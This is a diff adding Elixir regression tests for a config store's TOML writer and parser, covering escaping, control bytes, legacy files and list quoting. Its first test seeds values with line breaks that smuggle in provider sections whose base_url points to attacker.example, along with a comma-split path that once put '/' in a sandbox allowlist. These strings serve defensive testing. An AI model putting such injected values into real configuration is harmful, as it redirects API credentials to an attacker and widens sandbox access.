@@ -733,6 +733,153 @@ defmodule FermixCore.Setup.ConfigStoreTest do
     assert second.fermix_web == [port: 4555]
   end
 
+  # MGMT-1. The parser reads the file one line at a time and a later assignment
+  # wins, so a raw line break in a string value used to write lines of its own:
+  # a provider's base_url (where its credential is sent), a key the openai block
+  # refuses (the daemon then cannot boot) or the notetaker's announce switch.
+  # Seeded with the shapes the four writers hand the store: a routing slug,
+  # personalization prose, a plugin setting (never trimmed, so its ends travel
+  # too) and the meeting announcement.
+  test "a line break in a string value round-trips and never becomes a line of its own (MGMT-1)" do
+    tmp_home =
+      Path.join(System.tmp_dir!(), "fermix-config-store-#{System.unique_integer([:positive])}")
+
+    on_exit(fn -> FermixTestSupport.SafeRm.rm_rf!(tmp_home) end)
+    System.put_env("FERMIX_HOME", tmp_home)
+
+    subagent_model =
+      "gpt-5.4-mini\n[fermix_core.providers.anthropic]\nbase_url = https://attacker.example/v1\n#"
+
+    style =
+      "Short answers.\n[fermix_core.providers.openai]\nbase_url = https://attacker.example\n#"
+
+    setting =
+      "Work\tcalendar\r\n[fermix_core.providers.xai]\nbase_url = https://attacker.example\n"
+
+    announcement =
+      "Hello \"team\".\nNotes go to C:\\notes\\\n[fermix_core.meetings]\nannounce = false"
+
+    snapshot = %{
+      fermix_core: [
+        providers: [
+          anthropic: [base_url: "https://api.anthropic.com/v1", default_model: "claude-opus-5"],
+          openai: [default_model: "gpt-5.4"]
+        ],
+        personalization: [communication_style: style],
+        routing: [subagent_model: subagent_model],
+        plugins: [entries: %{"google_calendar" => [{"DEFAULT_CALENDAR", setting}]}],
+        meetings: [announce_message: announcement]
+      ],
+      fermix_channels: [],
+      fermix_web: []
+    }
+
+    assert :ok = ConfigStore.save_snapshot(snapshot)
+    assert {:ok, loaded} = ConfigStore.load_runtime_config(resolve_secrets: false)
+    core = loaded.fermix_core
+
+    assert core[:providers] == ConfigStore.persistable_snapshot(snapshot).fermix_core[:providers]
+    assert core[:routing][:subagent_model] == subagent_model
+    assert core[:personalization][:communication_style] == style
+    assert core[:plugins][:entries]["google_calendar"] == [{"DEFAULT_CALENDAR", setting}]
+    assert core[:meetings][:announce_message] == announcement
+    refute Keyword.has_key?(core[:meetings], :announce)
+  end
+
+  # One left-to-right pass that takes exactly one quote off each end, so a value
+  # that ends in a quote or a backslash, or that spells an escape itself, reads
+  # back as written, and no control byte reaches the file raw.
+  test "a value that spells an escape or ends in a quote or backslash reads back as written" do
+    tmp_home =
+      Path.join(System.tmp_dir!(), "fermix-config-store-#{System.unique_integer([:positive])}")
+
+    on_exit(fn -> FermixTestSupport.SafeRm.rm_rf!(tmp_home) end)
+    System.put_env("FERMIX_HOME", tmp_home)
+
+    settings = [
+      {"ENDS_IN_QUOTE", ~s(say "hi")},
+      {"ENDS_IN_BACKSLASH", "C:\\temp\\"},
+      {"SPELLS_ESCAPES", "a\\nb \\u0007 \\\""},
+      {"CONTROL", "bell\a nul\0 esc\e del\x7F"}
+    ]
+
+    snapshot = %{
+      fermix_core: [plugins: [entries: %{"google_calendar" => settings}]],
+      fermix_channels: [],
+      fermix_web: []
+    }
+
+    assert :ok = ConfigStore.save_snapshot(snapshot)
+
+    contents = File.read!(Path.join(tmp_home, "config.toml"))
+    refute contents |> String.replace("\n", "") |> String.match?(~r/[\x00-\x1F\x7F]/)
+
+    assert {:ok, loaded} = ConfigStore.load_runtime_config(resolve_secrets: false)
+    # A loaded section comes back sorted by key.
+    assert loaded.fermix_core[:plugins][:entries]["google_calendar"] == Enum.sort(settings)
+  end
+
+  # The only escapes the writer used to emit were `\\` and `\"`, so a file it
+  # wrote reads exactly as before, and a backslash sequence the writer never
+  # emits is kept as written, as it always was.
+  test "a settings file from the previous writer reads the same" do
+    tmp_home =
+      Path.join(System.tmp_dir!(), "fermix-config-store-#{System.unique_integer([:positive])}")
+
+    on_exit(fn -> FermixTestSupport.SafeRm.rm_rf!(tmp_home) end)
+    System.put_env("FERMIX_HOME", tmp_home)
+    File.mkdir_p!(tmp_home)
+
+    File.write!(Path.join(tmp_home, "config.toml"), """
+    [fermix_core.personalization]
+    user_name = "Ana \\"Q\\" C:\\\\d"
+    communication_style = "keep \\d as written"
+
+    [fermix_core.computer_history]
+    apps = ["com.apple.Safari", "a\\"b\\\\","c"]
+    """)
+
+    assert {:ok, loaded} = ConfigStore.load_runtime_config(resolve_secrets: false)
+    personalization = loaded.fermix_core[:personalization]
+
+    assert personalization[:user_name] == ~S(Ana "Q" C:\d)
+    assert personalization[:communication_style] == ~S(keep \d as written)
+    assert loaded.fermix_core[:computer_history][:apps] == ["com.apple.Safari", "a\"b\\", "c"]
+  end
+
+  # A list used to be split on every comma, quoted or not, and a piece that was a
+  # bare word came back as an element of its own: `/tmp/a,/,b` in allowed_roots
+  # reloaded with `/` in the allowlist. A quoted element is one element, commas
+  # and escaped quotes included.
+  test "a list element holding a comma or a quote reads back as one element" do
+    tmp_home =
+      Path.join(System.tmp_dir!(), "fermix-config-store-#{System.unique_integer([:positive])}")
+
+    on_exit(fn -> FermixTestSupport.SafeRm.rm_rf!(tmp_home) end)
+    System.put_env("FERMIX_HOME", tmp_home)
+
+    roots = ["/tmp/a,/,b", "/tmp/plain"]
+    apps = ["com.example.a,com.example.b", "com.apple.Safari"]
+    calendars = ["Work, home", ~s("quoted", too), "C:\\a,\\"]
+
+    snapshot = %{
+      fermix_core: [
+        computer_history: [apps: apps],
+        plugins: [entries: %{"google_calendar" => [{"CALENDARS", calendars}]}]
+      ],
+      sandbox: [allowed_roots: roots],
+      fermix_channels: [],
+      fermix_web: []
+    }
+
+    assert :ok = ConfigStore.save_snapshot(snapshot)
+    assert {:ok, loaded} = ConfigStore.load_runtime_config(resolve_secrets: false)
+
+    assert loaded.sandbox.allowed_roots == roots
+    assert loaded.fermix_core[:computer_history][:apps] == apps
+    assert loaded.fermix_core[:plugins][:entries]["google_calendar"] == [{"CALENDARS", calendars}]
+  end
+
   # M38 §4.7. The listener port is a home setting, and the pitfall this file's
   # gate above exists for is a section that normalizes one way: the live app-env
   # shape is what setup actually persists, so the round-trip is seeded with THAT
